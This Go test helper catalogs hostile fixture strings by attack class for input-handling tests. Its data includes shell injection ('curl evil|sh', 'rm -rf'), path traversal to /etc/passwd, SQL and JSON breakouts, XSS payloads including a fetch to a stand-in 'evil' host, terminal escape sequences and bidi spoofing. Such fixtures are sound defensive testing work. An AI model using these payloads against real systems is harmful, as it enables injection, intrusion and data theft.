// Copyright 2025-2026 HyperSWE
// SPDX-License-Identifier: Apache-2.0

package testutil

import "strings"

// HostileClass tags a hostile fixture with the attack class it exercises
// (MTIX-187.7). Children of MTIX-187.7 select fixtures by class.
type HostileClass string

// Hostile fixture classes. Every class has at least one HostileIDs fixture
// and one HostileText fixture.
const (
	ClassNUL             HostileClass = "nul"
	ClassESC             HostileClass = "esc_osc"
	ClassCRLF            HostileClass = "cr_lf"
	ClassBidi            HostileClass = "bidi"
	ClassZeroWidth       HostileClass = "zero_width"
	ClassInvalidUTF8     HostileClass = "invalid_utf8"
	ClassLong            HostileClass = "long"
	ClassTraversal       HostileClass = "dotdot"
	ClassSlash           HostileClass = "slash"
	ClassBackslash       HostileClass = "backslash"
	ClassShell           HostileClass = "shell_meta"
	ClassQuote           HostileClass = "quotes"
	ClassScript          HostileClass = "script_tag"
	ClassJSURI           HostileClass = "javascript_uri"
	ClassJSONBreaker     HostileClass = "json_breaker"
	ClassWindowsReserved HostileClass = "windows_reserved"
)

// HostileFixture is one named, class-tagged hostile value.
type HostileFixture struct {
	Name  string
	Class HostileClass
	Value string
}

// AllHostileClasses returns every declared class, in a stable order.
func AllHostileClasses() []HostileClass {
	return []HostileClass{
		ClassNUL, ClassESC, ClassCRLF, ClassBidi, ClassZeroWidth,
		ClassInvalidUTF8, ClassLong, ClassTraversal, ClassSlash,
		ClassBackslash, ClassShell, ClassQuote, ClassScript, ClassJSURI,
		ClassJSONBreaker, ClassWindowsReserved,
	}
}

// longHostileLen is just past 64 KiB.
const longHostileLen = 64*1024 + 1

// HostileIDs returns a fresh, stable catalog of hostile event or node IDs.
// Each call builds a new slice, so callers may mutate the result freely.
func HostileIDs() []HostileFixture {
	return []HostileFixture{
		{"nul_middle", ClassNUL, "evt\x00tail"},
		{"nul_only", ClassNUL, "\x00"},
		{"esc_csi_color", ClassESC, "evt\x1b[31mred\x1b[0m"},
		{"osc_title", ClassESC, "evt\x1b]0;pwned\x07"},
		{"osc8_link", ClassESC, "evt\x1b]8;;http://evil.example\x1b\\x\x1b]8;;\x1b\\"},
		{"c1_csi", ClassESC, "evt\u009b31m"},
		{"crlf_injection", ClassCRLF, "evt\r\nFORGED: line"},
		{"cr_overwrite", ClassCRLF, "evt-good\rEVIL"},
		{"bidi_rlo", ClassBidi, "evt\u202etxt.exe"},
		{"bidi_isolate", ClassBidi, "evt\u2066x\u2069"},
		{"zero_width_space", ClassZeroWidth, "ev\u200bt"},
		{"zero_width_joiner_bom", ClassZeroWidth, "\ufeffev\u200dt"},
		{"invalid_utf8_lone_continuation", ClassInvalidUTF8, "evt\x80\x81"},
		{"invalid_utf8_truncated", ClassInvalidUTF8, "evt\xe2\x82"},
		{"long_64kib_plus", ClassLong, strings.Repeat("a", longHostileLen)},
		{"dotdot_relative", ClassTraversal, "../../etc/passwd"},
		{"dotdot_only", ClassTraversal, ".."},
		{"slash_absolute", ClassSlash, "/etc/passwd"},
		{"slash_embedded", ClassSlash, "a/b/c"},
		{"backslash_windows_path", ClassBackslash, `..\..\windows\system32`},
		{"backslash_embedded", ClassBackslash, `a\b`},
		{"shell_subshell", ClassShell, "$(touch pwned)"},
		{"shell_backtick_semicolon", ClassShell, "`id`; rm -rf x | cat > y & z"},
		{"quote_single_breakout", ClassQuote, "evt' OR '1'='1"},
		{"quote_double_breakout", ClassQuote, `evt" onmouseover="x`},
		{"script_tag", ClassScript, "<script>alert(1)</script>"},
		{"script_img_onerror", ClassScript, "<img src=x onerror=alert(1)>"},
		{"javascript_uri", ClassJSURI, "javascript:alert(1)"},
		{"javascript_uri_mixed_case", ClassJSURI, "JaVaScRiPt:alert(1)"},
		{"json_quote_brace", ClassJSONBreaker, `evt","admin":true,"x":"`},
		{"json_script_close", ClassJSONBreaker, `</script><script>alert(1)//`},
		{"windows_reserved_con", ClassWindowsReserved, "CON"},
		{"windows_reserved_nul_ext", ClassWindowsReserved, "nul.txt"},
		{"windows_reserved_com1", ClassWindowsReserved, "COM1"},
	}
}

// HostileText returns a fresh, stable catalog of hostile ticket text
// (title, description, prompt, annotation bodies). It carries the same
// classes as HostileIDs, with prose-style payloads and a fixture over 64 KiB.
func HostileText() []HostileFixture {
	return []HostileFixture{
		{"nul_in_title", ClassNUL, "Fix\x00 the bug"},
		{"esc_clear_screen", ClassESC, "Title\x1b[2J\x1b[HFAKE"},
		{"osc_set_title", ClassESC, "Task\x1b]0;owned\x07"},
		{"crlf_forged_header", ClassCRLF, "Title\r\nStatus: done"},
		{"cr_spoof", ClassCRLF, "pending\rdone    "},
		{"bidi_override", ClassBidi, "Approve \u202egnp.exe\u202c now"},
		{"zero_width_split", ClassZeroWidth, "dele\u200bte"},
		{"invalid_utf8_bytes", ClassInvalidUTF8, "caf\xc3 bad \xff\xfe"},
		{"long_64kib_plus", ClassLong, strings.Repeat("x", longHostileLen)},
		{"dotdot_in_text", ClassTraversal, "see ../../secrets"},
		{"slash_in_text", ClassSlash, "/etc/shadow and a/b"},
		{"backslash_in_text", ClassBackslash, `C:\Users\x and a\b`},
		{"shell_in_text", ClassShell, "run `curl evil|sh`; $(id) && rm"},
		{"quotes_in_text", ClassQuote, `He said "hi" and 'bye' ' " `},
		{"script_in_text", ClassScript, "<script>fetch('//evil')</script><iframe src=x>"},
		{"javascript_link", ClassJSURI, "[click](javascript:alert(1))"},
		{"json_breaker_text", ClassJSONBreaker, `"}],"admin":true,"x":["`},
		{"windows_reserved_text", ClassWindowsReserved, "AUX.log PRN COM9"},
	}
}
